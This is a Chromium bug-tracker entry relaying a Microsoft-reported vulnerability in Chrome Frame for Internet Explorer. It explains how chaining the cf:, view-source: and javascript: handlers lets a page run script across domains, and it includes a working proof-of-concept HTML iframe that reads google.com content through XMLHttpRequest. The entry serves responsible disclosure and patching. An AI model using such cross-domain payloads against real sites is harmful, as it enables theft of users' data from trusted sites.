<title>Issue 26129 -   chromium -    Security: MSVR report: Chrome Frame allows x-domain data theft in IE - Project Hosting on Google Code</title> <pre> Microsoft just reported an issue that allows cross-domain code stealing   exploit using ChromeFrame plugin in Internet Explorer    MSVR Case Identifier: Cross-domain information stealing via Google   ChromeFrame [MSVR-09-0061]    Finder: Billy Rios and Microsoft Vulnerability Research (MSVR)    Technical Details of the exploit:        A specially crafted web page can use ChromeFrame running in IE  to   steal the script and html content from any arbitrary web site using   XMLHTTP. This page forces ChromeFrame to load using the cf: protocol   handler  pointing ChromeFrame to the view-source: protocol handler  and   then finally points the view-source: protocol  handler to a JavaScript URI.   This permits the attacker to run arbitrary JavaScript without domain   restrictions  including access to the network stack and arbitrary web pages   (though not the local filesystem). while the PoC supplied is directed at   extracting content from Google.com  the exploit could be used for one site   (badguy.com) to attack another (trusted-bank.com).      PoC Code:  &lt;html&gt;  &lt;title&gt;  Cross Domain Bug in Chrome Frame  &lt;/title&gt;  &lt;body&gt;  &lt;h1&gt;  Cross Domain Bug in Chrome Frame  &lt;/h1&gt;  This Page pulls content from Google.com using XMLHTTP  &lt;iframe src=&quot;cf:view-source:javascript:req = new   XMLHttpRequest();req.onreadystatechange = function(){if(req.readyState ==   4){if(req.status ==   200){alert(req.responseText);}else{alert(req.status);}}};req.open('GET'    'http://www.google.com' true);req.send(null);&quot;&gt; &lt;/iframe&gt;  &lt;/body&gt;  &lt;/html&gt;    Change the url  if trying from google.com domain.     </pre>
